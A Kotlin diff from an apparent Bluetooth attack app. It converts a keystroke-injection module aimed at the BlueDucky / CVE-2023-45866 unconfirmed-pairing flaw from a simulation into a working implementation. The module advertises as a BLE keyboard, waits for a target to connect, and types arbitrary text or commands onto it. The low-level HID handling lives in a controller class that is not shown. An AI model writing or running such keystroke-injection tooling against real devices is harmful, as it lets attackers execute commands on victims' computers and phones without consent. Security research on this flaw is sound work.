@@ -1,6 +1,7 @@
 package com.hereliesaz.blusnu.data
 
-import kotlinx.coroutines.delay
+import kotlinx.coroutines.flow.first
+import kotlinx.coroutines.withTimeoutOrNull
 
 /**
  * Module responsible for Keystroke Injection attacks (e.g., BlueDucky / CVE-2023-45866).
@@ -9,53 +10,60 @@ import kotlinx.coroutines.delay
  * impersonates a Human Interface Device (HID) like a keyboard. On vulnerable devices,
  * the pairing occurs without user confirmation, allowing the attacker to inject
  * arbitrary keystrokes (scripts).
+ *
+ * Delegates all BLE HID operations to [BleHidController].
  */
-class KeystrokeInjectionModule {
+class KeystrokeInjectionModule(private val hidController: BleHidController) {
 
-    // Tracks if we have successfully paired as a keyboard.
-    private var isPaired = false
+    companion object {
+        /** Timeout in milliseconds to wait for a BLE HID connection after advertising starts. */
+        private const val CONNECTION_TIMEOUT_MS = 30_000L
+    }
 
     /**
      * Attempts to pair with the target device as a Keyboard.
      *
-     * @param device The target device to pair with.
-     * @return `true` if pairing is successful (or simulated successful).
+     * Initializes the BLE HID GATT server and begins advertising. Waits up to
+     * [CONNECTION_TIMEOUT_MS] for a remote device to connect.
+     *
+     * @param device The target device (used for context; the actual connection is
+     *               initiated by the remote device connecting to our advertisement).
+     * @return `true` if a device connected within the timeout, `false` on error or timeout.
      */
     suspend fun attemptPairing(device: TargetDevice): Boolean {
-        // Simulate the delay of the pairing process (Authentication, SMP negotiation).
-        delay(2000)
+        // Initialize the GATT server (registers HID service, battery service, etc.)
+        hidController.initialize()
 
-        // In a real implementation, this would involve:
-        // 1. Setting the local Bluetooth Class of Device (CoD) to Peripheral/Keyboard (0x002540).
-        // 2. Initiating a connection or waiting for the host to scan.
-        // 3. Handling the "Just Works" confirmation in the background.
-
-        // Log simulation status.
-        println("Simulating pairing with ${device.name ?: device.macAddress}")
-
-        // Mark as paired.
-        isPaired = true
-        return isPaired
-    }
-
-    /**
-     * Injects a sequence of keystrokes (text or commands).
-     *
-     * @param text The string to type on the target device.
-     * @return `true` if sent successfully.
-     */
-    suspend fun sendKeystrokes(text: String): Boolean {
-        if (!isPaired) {
+        // Check if initialization failed
+        if (hidController.connectionState.value == HidConnectionState.ERROR) {
             return false
         }
 
-        // Simulate typing delay (human-like or script speed).
-        delay(500)
+        // Start BLE advertising so the target can discover and connect to us
+        hidController.startAdvertising()
 
-        // In a real implementation, this would involve sending HID Reports via L2CAP interrupt channel.
-        // Report ID: 1, Modifier: 0, KeyCode: [Map char to HID Usage ID]
+        // Wait for the connection state to reach CONNECTED or ERROR
+        val finalState = withTimeoutOrNull(CONNECTION_TIMEOUT_MS) {
+            hidController.connectionState.first { state ->
+                state == HidConnectionState.CONNECTED || state == HidConnectionState.ERROR
+            }
+        }
 
-        println("Simulating sending keystrokes: $text")
+        return finalState == HidConnectionState.CONNECTED
+    }
+
+    /**
+     * Injects a sequence of keystrokes (text or commands) via the BLE HID connection.
+     *
+     * @param text The string to type on the target device.
+     * @return `true` if sent successfully, `false` if not connected.
+     */
+    suspend fun sendKeystrokes(text: String): Boolean {
+        if (hidController.connectionState.value != HidConnectionState.CONNECTED) {
+            return false
+        }
+
+        hidController.typeString(text)
         return true
     }
 }
